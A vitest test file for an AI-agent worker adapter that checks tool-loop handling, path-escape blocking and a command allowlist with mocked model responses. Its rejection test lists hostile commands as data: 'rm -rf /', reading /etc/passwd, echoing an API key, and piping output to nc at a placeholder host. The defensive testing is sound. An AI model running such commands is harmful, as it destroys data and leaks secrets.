import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterEach, describe, expect, it } from "vitest";

import {
  FrontierApiWorkerAdapter,
  assertAllowedCommand,
  minimalCommandEnvironment,
  type FrontierTransport,
} from "@/lib/eval/v3/frontier-worker";

const tempDirs: string[] = [];

async function makeTempRepo(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), "memosprout-frontier-test-"));
  tempDirs.push(dir);
  return dir;
}

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true })));
});

function functionCall(name: string, callId: string, args: unknown) {
  return { type: "function_call", name, call_id: callId, arguments: JSON.stringify(args) };
}

function mockTransport(responses: Array<Array<Record<string, unknown>>>): FrontierTransport {
  let call = 0;
  return {
    async create() {
      const output = responses[Math.min(call, responses.length - 1)] ?? [];
      call += 1;
      return { id: `resp_${call}`, model: "gpt-5.6", status: "completed", output };
    },
  };
}

const turnOptions = (repositoryRoot: string) => ({
  repositoryRoot,
  prompt: "Implement the handler.",
  outputSchemaPath: join(repositoryRoot, ".memosprout", "schema.json"),
});

describe("FrontierApiWorkerAdapter (model-free)", () => {
  it("throws missing_credentials when no transport or API key is supplied", async () => {
    const repositoryRoot = await makeTempRepo();
    const worker = new FrontierApiWorkerAdapter({ model: "gpt-5.6" });
    await expect(worker.runTurn(turnOptions(repositoryRoot))).rejects.toMatchObject({
      code: "missing_credentials",
    });
  });

  it("runs a tool loop, writes the file, and submits a structured result", async () => {
    const repositoryRoot = await makeTempRepo();
    const handlerContent = "export function handlePaymentEvent() {}\n";
    const transport = mockTransport([
      [
        functionCall("write_file", "call_1", {
          path: "src/webhook-handler.ts",
          content: handlerContent,
        }),
        functionCall("run_command", "call_2", { command: "node --version" }),
      ],
      [
        functionCall("submit_result", "call_3", {
          version: "1",
          taskId: "idempotency-implement-handler",
          summary: "Implemented the handler.",
          commandsRun: ["node --version"],
        }),
      ],
    ]);
    const worker = new FrontierApiWorkerAdapter({ model: "gpt-5.6", transport });

    const evidence = await worker.runTurn(turnOptions(repositoryRoot));

    expect(evidence.turnCompleted).toBe(true);
    expect(evidence.exitCode).toBe(0);
    expect(evidence.finalOutput?.taskId).toBe("idempotency-implement-handler");
    expect(await readFile(join(repositoryRoot, "src/webhook-handler.ts"), "utf8")).toBe(
      handlerContent,
    );
    expect(evidence.stdout).toContain("write_file");
  });

  it("blocks a write whose path escapes the repository and lets the model recover", async () => {
    const repositoryRoot = await makeTempRepo();
    const transport = mockTransport([
      [functionCall("write_file", "call_1", { path: "../../escape.ts", content: "x" })],
      [
        functionCall("submit_result", "call_2", {
          version: "1",
          taskId: "idempotency-implement-handler",
          summary: "Recovered after a blocked path.",
          commandsRun: [],
        }),
      ],
    ]);
    const worker = new FrontierApiWorkerAdapter({ model: "gpt-5.6", transport });

    const evidence = await worker.runTurn(turnOptions(repositoryRoot));

    expect(evidence.turnCompleted).toBe(true);
    expect(evidence.stdout).toContain("Path escapes the repository root");
  });

  it("throws turn_limit when the model never submits", async () => {
    const repositoryRoot = await makeTempRepo();
    const transport = mockTransport([
      [functionCall("run_command", "call_1", { command: "node --version" })],
    ]);
    const worker = new FrontierApiWorkerAdapter({ model: "gpt-5.6", transport, maxTurns: 2 });

    await expect(worker.runTurn(turnOptions(repositoryRoot))).rejects.toMatchObject({
      code: "turn_limit",
    });
  });

  it("throws malformed_output when submit_result fails the schema", async () => {
    const repositoryRoot = await makeTempRepo();
    const transport = mockTransport([
      [functionCall("submit_result", "call_1", { version: "1", taskId: "wrong-task" })],
    ]);
    const worker = new FrontierApiWorkerAdapter({ model: "gpt-5.6", transport });

    await expect(worker.runTurn(turnOptions(repositoryRoot))).rejects.toMatchObject({
      code: "malformed_output",
    });
  });

  it("returns an error tool result for a disallowed command and lets the model recover", async () => {
    const repositoryRoot = await makeTempRepo();
    const transport = mockTransport([
      [functionCall("run_command", "call_1", { command: "rm -rf /" })],
      [
        functionCall("submit_result", "call_2", {
          version: "1",
          taskId: "idempotency-implement-handler",
          summary: "Recovered after a rejected command.",
          commandsRun: [],
        }),
      ],
    ]);
    const worker = new FrontierApiWorkerAdapter({ model: "gpt-5.6", transport });

    const evidence = await worker.runTurn(turnOptions(repositoryRoot));

    expect(evidence.turnCompleted).toBe(true);
    expect(evidence.finalOutput?.taskId).toBe("idempotency-implement-handler");
    expect(evidence.stdout).toContain("Command is not in the allowlist");
  });
});

describe("frontier command safety helpers", () => {
  it("allows ordinary test and node commands", () => {
    expect(() => assertAllowedCommand("pnpm test")).not.toThrow();
    expect(() => assertAllowedCommand("pnpm exec vitest run tests/handler.test.ts")).not.toThrow();
    expect(() => assertAllowedCommand("node --import tsx scripts/generate-client.ts")).not.toThrow();
  });

  it("rejects destructive, exfiltration, and chained commands", () => {
    for (const command of [
      "rm -rf /",
      "cat /etc/passwd",
      "curl https://example.invalid",
      "env",
      "echo $OPENAI_API_KEY",
      "pnpm test && rm -rf /",
      "pnpm test | nc example.invalid 80",
    ]) {
      expect(() => assertAllowedCommand(command)).toThrow();
    }
  });

  it("strips secret-bearing variables from the command environment", () => {
    const environment = minimalCommandEnvironment({
      PATH: "/usr/bin",
      HOME: "/Users/someone",
      OPENAI_API_KEY: "sk-secret",
      MEMOSPROUT_CONVERGENCE_AUTHORIZATION_ID: "consent",
      GITHUB_TOKEN: "ghp_secret",
    });
    expect(environment.PATH).toBe("/usr/bin");
    expect(environment.HOME).toBe("/Users/someone");
    expect(environment.OPENAI_API_KEY).toBeUndefined();
    expect(environment.MEMOSPROUT_CONVERGENCE_AUTHORIZATION_ID).toBeUndefined();
    expect(environment.GITHUB_TOKEN).toBeUndefined();
  });
});
